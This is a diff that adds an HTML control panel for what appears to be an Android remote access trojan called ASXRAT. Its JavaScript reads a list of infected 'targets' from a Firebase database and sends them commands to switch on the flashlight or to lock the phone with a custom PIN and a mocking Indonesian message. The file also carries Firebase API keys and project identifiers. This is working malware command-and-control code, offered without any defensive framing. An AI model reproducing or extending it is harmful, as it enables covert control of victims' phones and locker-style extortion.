@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ASXRAT | ADMIN CONTROL</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <style>
+        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; padding: 20px; }
+        .header { text-align: center; border-bottom: 2px solid #ff0000; padding-bottom: 10px; margin-bottom: 20px; }
+        .container { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 15px; }
+        .card { background: #110000; border: 1px solid #ff0000; padding: 15px; border-radius: 8px; box-shadow: 0 0 10px rgba(255,0,0,0.2); }
+        h3 { margin: 0 0 10px 0; font-size: 16px; color: #fff; }
+        
+        .input-group { margin-top: 10px; border-top: 1px solid #300; padding-top: 10px; }
+        input { background: #000; border: 1px solid #500; color: #fff; padding: 8px; width: 90%; margin-bottom: 5px; outline: none; }
+        
+        button { width: 100%; padding: 10px; margin: 4px 0; border: none; cursor: pointer; font-weight: bold; text-transform: uppercase; }
+        .btn-flash { background: #ffcc00; color: #000; }
+        .btn-lock { background: #ff0000; color: #fff; }
+        .status-on { color: #00ff00; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <h1>ASXRAT DASHBOARD</h1>
+        <p>CONTROL-RAT PROJECT | DEV BY ELVOXI CEO</p>
+    </div>
+
+    <div class="container" id="targetList">Loading...</div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBfeY-xJ4TQWrQq8IZwwsigP9jwPpstThk",
+            authDomain: "control-rat.firebaseapp.com",
+            databaseURL: "https://control-rat-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "control-rat",
+            appId: "1:181283651682:web:42a169e6daaad00f7e513b"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // Pantau Target Online
+        db.ref('targets').on('value', (snapshot) => {
+            const list = document.getElementById('targetList');
+            list.innerHTML = "";
+            const targets = snapshot.val();
+            
+            for(let id in targets) {
+                const t = targets[id];
+                const card = document.createElement('div');
+                card.className = 'card';
+                card.innerHTML = `
+                    <h3>📱 ID: ${id}</h3>
+                    <p>Status: <span class="status-on">${t.status}</span></p>
+                    
+                    <button class="btn-flash" onclick="sendCmd('${id}', 'on')">🔦 FLASH ON</button>
+                    <button class="btn-flash" style="background:#444; color:#fff;" onclick="sendCmd('${id}', 'off')">OFF</button>
+                    
+                    <div class="input-group">
+                        <label style="font-size:10px">PESAN LOCK:</label><br>
+                        <input type="text" id="msg_${id}" value="TERKUNCI KAN HP LU WKWK">
+                        
+                        <label style="font-size:10px">PIN CUSTOM:</label><br>
+                        <input type="number" id="pin_${id}" value="7777">
+                        
+                        <button class="btn-lock" onclick="executeLock('${id}')">🔒 KUNCI PERANGKAT</button>
+                    </div>
+                `;
+                list.appendChild(card);
+            }
+        });
+
+        // Kirim Senter
+        function sendCmd(id, stat) {
+            db.ref('commands/' + id).update({
+                type: "flash",
+                status: stat
+            });
+        }
+
+        // Kirim Lock dengan PIN Custom
+        function executeLock(id) {
+            const pesan = document.getElementById('msg_' + id).value;
+            const pinCustom = document.getElementById('pin_' + id).value;
+
+            if(!pinCustom) return alert("PIN GAK BOLEH KOSONG COK!");
+
+            db.ref('commands/' + id).set({
+                type: "lock",
+                status: "on",
+                message: pesan,
+                pin: pinCustom, // INI YANG LO MAU! PIN DISET DARI DASHBOARD
+                time: Date.now()
+            }).then(() => {
+                alert("COMMAND SENT! PIN: " + pinCustom);
+            });
+        }
+    </script>
+</body>
+</html>
